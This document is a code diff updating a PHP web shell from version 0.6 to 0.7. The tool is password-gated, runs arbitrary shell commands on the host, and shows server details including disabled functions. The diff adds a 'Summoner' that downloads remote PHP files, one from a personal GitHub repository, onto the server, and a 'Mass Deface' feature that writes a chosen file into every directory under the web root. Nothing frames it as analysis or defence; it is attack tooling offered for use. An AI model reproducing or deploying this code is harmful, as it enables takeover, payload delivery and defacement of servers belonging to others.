@@ -1,6 +1,6 @@
 <?php
 session_start();
-define('APP_VER', '0.6');
+define('APP_VER', '0.7');
 $password = defined('PW') ? PW : '5c5fa09440696b310b4b1750d49f84ca';
 
 // Undetect bots
@@ -38,31 +38,53 @@ $search = isset($_GET['search']) ? $_GET['search'] : '';
 // Handle POST actions
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
     try {
-        $self = basename(__FILE__);
+        $self = __FILE__;
         if($action=='command' && isset($_POST['cmd'])){
             $cmd_path = isset($_POST['path']) ? $_POST['path'] : getcwd();
             if (is_dir($cmd_path)) { chdir($cmd_path); }
-            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}elseif (function_exists('proc_open')) {
-            $d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($_POST['cmd'],$d,$pipes);
-            if (is_resource($p)) {
-                fclose($pipes[0]);
-                $output = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);
-                fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
-            }else{$output="proc_open failed!";}}else{$output="Server function disabled!";}
+            if(function_exists('shell_exec')){$output = shell_exec($_POST['cmd'].' 2>&1');}elseif (function_exists('proc_open')) {$d = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']]; $p = proc_open($_POST['cmd'],$d,$pipes);if (is_resource($p)) {fclose($pipes[0]);$output = stream_get_contents($pipes[1]).stream_get_contents($pipes[2]);fclose($pipes[1]); fclose($pipes[2]); proc_close($p);}else{$output="proc_open failed!";}}else{$output="Server function disabled!";}
             echo '<pre class="bg-black text-green-400 p-2 rounded">'.$output.'</pre>';
             exit;
         }
+        elseif (isset($_POST['summon_url'], $_POST['summon_path'])) {
+            $url = trim($_POST['summon_url']);
+            $dir = rtrim($_POST['summon_path'], '/\\');
+            $file = basename(parse_url($url, PHP_URL_PATH));
+            $save = $dir.'/'.$file;
+
+            if (!filter_var($url, FILTER_VALIDATE_URL))
+                $_SESSION['msg']="URL Not Valid to Summon!";
+            elseif (file_exists($save))
+                $_SESSION['msg']="<b>$file</b> already Summoned!";
+            elseif (($data = @file_get_contents($url)) === false)
+                $_SESSION['msg']="Failed summon from selected program!";
+            elseif (@file_put_contents($save, $data) !== false)
+                $_SESSION['msg']="<b>$file</b> Summoned!";
+            else
+                $_SESSION['msg']="Failed summon!";
+            
+            $_SESSION['msg_type'] = strpos($_SESSION['msg'], 'Summoned!') !== false ? 'success' : 'error';
+            exit;
+        }
+        else if ($action=='mdfc' && isset($_POST['mdfc_base_dir'], $_POST['mdfc_name'], $_POST['mdfc_content'])) {
+            function mdfc($d,$f,$c,&$s=0,&$g=0){
+                if(!is_dir($d))return;
+                $p=rtrim($d,'/')."/".$f;
+                if(@file_put_contents($p,$c)!==false){echo "[✓] $p\n";$s++;}else{echo "[✗] $p\n";$g++;}
+                foreach(scandir($d)as$i)if($i!='.'&&$i!='..'&&is_dir($d.'/'.$i))mdfc($d.'/'.$i,$f,$c,$s,$g);
+            }
+            echo "<pre>";
+            mdfc($_POST['mdfc_base_dir'],basename($_POST['mdfc_name']),$_POST['mdfc_content'],$s,$g);
+            echo "\Done. Success: $s | Failed: $g</pre>";exit;
+        }
+
         elseif (isset($_POST['get_content'])) {
             $f = basename($_POST['get_content']);
             if ($f == $self) {
                 echo 'Author @willygoid';
             } else {
                 $file = $path.'/'.$f;
-                if (is_file($file)) {
-                    echo file_get_contents($file);
-                } else {
-                    echo '';
-                }
+                if (is_file($file)) {echo file_get_contents($file);} else {echo '';}
             }
             exit;
         }
@@ -238,7 +260,7 @@ function getServerInfo(){
         'OS' => php_uname(),
         'PHP Version' => PHP_VERSION,
         'Server Software' => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'CLI',
-        'Disabled Functions' => ($d = ini_get('disable_functions')) ? $d : '-',
+        'Disabled Functions' => ($d = ini_get('disable_functions')) ? implode(', ', explode(',', $d)) : '-',
         'Loaded Extensions' => implode(', ', get_loaded_extensions()),
         'My IP' => isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '-',
         'User:Group' => get_current_user() . ':' . (function_exists('posix_getgrgid') && function_exists('posix_geteuid') ? posix_getgrgid(posix_geteuid())['name'] : '?'),
@@ -295,6 +317,15 @@ $(function(){
     $('.menu-btn[data-action="<?=$action?>"]').addClass('bg-blue-500 text-white').removeClass('bg-gray-200 text-gray-800');
 });
 </script>
+<script>
+    $('#summon-btn').on('click', function () {
+        const url = $('#summon-url').val();
+        const path = <?= json_encode($path) ?>;
+        $.post('', { summon_url: url, summon_path: path }, function () {
+            location.reload();
+        });
+    });
+</script>
 <link href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css" rel="stylesheet">
 <script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.js"></script>
 </head>
@@ -311,6 +342,15 @@ $(function(){
     <button data-action="filemanager" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📁 File Manager</button>
     <button data-action="serverinfo" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💻 Server Info</button>
     <button data-action="command" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">💡 Command</button>
+    <div class="flex">
+        <select id="summon-url" class="bg-gray-200 text-gray-800 px-3 py-1 border border-gray-300 rounded-l">
+            <option value="">🧙🏼 Summoner</option>
+            <option value="https://github.com/vrana/adminer/releases/download/v5.3.0/adminer-5.3.0-en.php">Adminer</option>
+            <option value="https://raw.githubusercontent.com/dan1584/asfdas/refs/heads/main/cp.php">Cpanel Manager</option>
+        </select>
+        <button id="summon-btn" class="bg-gray-200 text-gray-800 px-3 py-1 border border-gray-300 border-l-0 rounded-r">🪄</button>
+    </div>
+    <button data-action="mdfc" class="menu-btn bg-gray-200 text-gray-800 px-3 py-1 rounded">📑 Mass Deface</button>
 </div>
 <main role="main" class="container mx-auto mb-4">
 <nav class="flex px-5 py-3 text-gray-700 border border-gray-200 rounded-lg bg-gray-50" aria-label="Breadcrumb">
@@ -361,6 +401,42 @@ if($action=='serverinfo'):
     </form>
     <div id="output" class="mt-2 text-sm"></div>
     </div>
+
+<?php elseif($action=='mdfc'): ?>
+<div class="container mx-auto p-4 bg-white rounded-lg shadow">
+    <h2 class="text-2xl font-bold mb-4 text-center">Mass Write File</h2>
+    <div class="space-y-6  mx-12">
+        <form method="POST" onsubmit="$.post('?action=mdfc', $(this).serialize(), function(d){$('#output').html('<pre class=&quot;bg-black text-green-400 p-4 rounded&quot;>'+d+'</pre>');}); return false;">
+            <div class="space-y-6">
+                <div class="flex space-x-6">
+                    <div class="w-2/3">
+                        <label for="mdfc_base_dir" class="block text-sm font-medium text-gray-700 mb-2">Base Dir <span class="text-red-500">*</span></label>
+                        <input id="mdfc_base_dir" type="text" name="mdfc_base_dir" value="<?=$docroot?>" class="w-full rounded-md border border-gray-300 px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                    </div>
+                    <div class="w-1/3">
+                        <label for="mdfc_public_dir" class="block text-sm font-medium text-gray-700 mb-2">Public_Html</label>
+                        <input id="mdfc_public_dir" type="text" name="mdfc_public_dir" placeholder="public_html (opsional)" class="w-full rounded-md border border-gray-300 px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                    </div>
+                </div>
+            </div>
+
+            <div class="space-y-2 mt-2">
+                <div>
+                    <label for="mdfc_name" class="block text-sm font-medium text-gray-700 mb-2">File Name <span class="text-red-500"> *</span></label>
+                    <input id="mdfc_name" type="text" name="mdfc_name" placeholder="index.php" class="w-full rounded-md border border-gray-300 px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"/>
+                </div>
+                <div>
+                    <label for="mdfc_content" class="block text-sm font-medium text-gray-700 mb-2">File Content <span class="text-red-500"> *</span></label>
+                    <textarea id="mdfc_content" rows="6" name="mdfc_content" placeholder="File Content here" class="w-full rounded-md border border-gray-300 px-4 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500"></textarea>
+                </div>
+            </div>
+            
+            <button type="submit" class="bg-green-500 text-white px-6 py-3 rounded hover:cursor-pointer mt-4 w-full">Start</button>
+        </form>
+
+        <div id="output" class="mt-4 text-sm text-gray-700"></div>
+    </div>
+</div>
 
 <?php else: ?>
 
@@ -414,7 +490,7 @@ if($action=='serverinfo'):
     <tr class="border-t hover:bg-yellow-200 hover:text-gray-900" title="<?=htmlspecialchars($f['name'])?>">
     <td class="p-2"><?php if(is_dir($fp)):?><a href="?path=<?=urlencode($fp)?>" class="text-blue-500">📁 <?=htmlspecialchars($f['name'])?></a><?php else:?>📄 <?=htmlspecialchars($f['name'])?><?php endif;?></td>
     <td class="p-2"><?=htmlspecialchars($f['owner'])?></td>
-    <td class="p-2"><?=htmlspecialchars($f['size'])?></td>
+    <td class="p-2"><?=!empty($f['size']) ? htmlspecialchars($f['size']) : '-'?></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-perm="<?=htmlspecialchars($f['perm'])?>" class="perm-btn underline px-2 py-1 rounded <?=is_writable($fp)?'bg-green-200 text-green-800':'bg-gray-200 text-base'?>"><?=$f['perm']?></button></td>
     <td class="p-2"><button data-file="<?=htmlspecialchars($f['name'])?>" data-mtime="<?=$mtime?>" class="mtime-btn underline text-blue-500"><?=date('Y-m-d H:i',$f['mtime'])?></button></td>
     <td class="p-2 space-x-1"><?php if(!is_dir($fp)):?><button data-file="<?=htmlspecialchars($f['name'])?>" class="edit-btn bg-gray-300 px-2 rounded" title="Edit">📝</button><?php endif;?><button data-file="<?=htmlspecialchars($f['name'])?>" class="rename-btn bg-gray-300 px-2 rounded" title="Rename">✍🏼</button><button data-file="<?=htmlspecialchars($f['name'])?>" class="delete-btn bg-gray-300 px-2 rounded" title="Delete">🗑️</button></td></tr><?php endforeach;?>
